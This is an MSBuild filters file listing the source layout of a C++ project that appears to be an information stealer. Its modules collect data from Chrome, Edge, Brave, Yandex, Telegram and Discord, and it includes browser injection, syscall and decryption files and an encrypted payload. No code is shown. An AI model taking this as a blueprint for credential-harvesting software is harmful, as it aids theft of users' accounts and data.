<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\Сhrome_Edge_Brave\syscalls.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\Сhrome_Edge_Brave\browser_inject.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\System\sys_module.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\browser_manager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\Telegram\telegram_module.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\Discord\discord_module.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="libs\sqlite\sqlite3.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\Yandex\aes256gcm.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\Yandex\sha1.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="modules\data_collection\Yandex\yandex_module.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="modules\data_collection\Сhrome_Edge_Brave\syscalls.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\Сhrome_Edge_Brave\browser_inject.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\System\sys_module.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\browser_manager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\Telegram\telegram_module.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\Discord\discord_module.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="libs\sqlite\sqlite3.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\Yandex\aes256gcm.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\Yandex\base64.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\Yandex\sha1.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="modules\data_collection\Yandex\yandex_module.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="libs\chacha\chacha20.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="modules\data_collection\Сhrome_Edge_Brave\resource.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="modules\data_collection\Сhrome_Edge_Brave\browser_decrypt.enc" />
    <None Include="modules\data_collection\Сhrome_Edge_Brave\py_discord.exe" />
  </ItemGroup>
  <ItemGroup>
    <Library Include="libs\sqlite\sqlite3.lib" />
  </ItemGroup>
</Project>